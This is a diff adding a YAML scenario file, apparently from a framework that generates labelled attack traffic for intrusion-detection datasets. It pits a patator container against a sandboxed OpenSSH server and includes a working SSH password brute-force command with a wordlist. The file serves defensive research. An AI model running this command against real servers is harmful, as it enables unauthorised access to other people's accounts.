@@ -1,0 +1,30 @@
+type: single-target
+attacker:
+  name: patator
+  image: ghcr.io/idlab-discover/concap/patator:cic
+  atkCommand: python3 /opt/patator/patator.py ssh_login host=$TARGET_IP user=iscxtap password=FILE0 0=/usr/share/wordlists/2023-200_most_used_passwords.txt -x ignore:mesg='Authentication failed.'
+  atkTime: 60s
+  cpuRequest: 250m
+  memRequest: 256Mi
+target:
+  name: openssh-server
+  image: ghcr.io/idlab-discover/concap/openssh-server:cic-1.0.0
+  cpuRequest: 200m
+  memRequest: 256Mi
+  startupProbe:
+    tcpSocket:
+      port: 22
+    periodSeconds: 1
+    failureThreshold: 30
+network:
+  bandwidth: 100Mbit
+  queueSize: 100ms
+  delay: 1ms
+  jitter: 0ms
+  loss: 0%
+labels:
+  label: "1"
+  category: credential-access
+  subcategory: ssh-dictionary-patator-cic
+  service: ssh
+  mitreTechnique: T1110.001
